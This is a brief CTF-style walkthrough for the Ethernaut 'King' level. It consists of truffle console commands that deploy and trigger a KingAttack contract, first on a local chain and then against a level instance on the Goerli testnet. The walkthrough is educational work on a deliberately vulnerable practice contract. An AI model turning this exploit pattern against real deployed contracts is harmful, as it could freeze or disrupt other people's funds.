# King

[King](https://ethernaut.openzeppelin.com/level/0x725595BA16E76ED1F6cC1e1b65A88365cC494824)


## Test Attack

```BASH
truffle develop
```

```JS
migrate

k1 = await King.deployed()
(await k1.prize()).toString()
await k1._king()
await web3.eth.sendTransaction({from: accounts[9], to: k1.address, value: 15})
await k1._king()


k2 = await KingAttack.deployed()
await web3.eth.getBalance(k2.address)
await k2.youKing()
```

<BR />


## Live Attack

```BASH
truffle console --network goerli
```

```JS
k1 = await King.at('0x86a68e10f55baccC4d979dE3b389d3b38B5d1Fe6')
(await k1.prize()).toString()
await k1._king()

k2 = await KingAttack.deployed()
await web3.eth.getBalance(k2.address)
sender = accounts[5]
await k2.youKing({from: sender})
```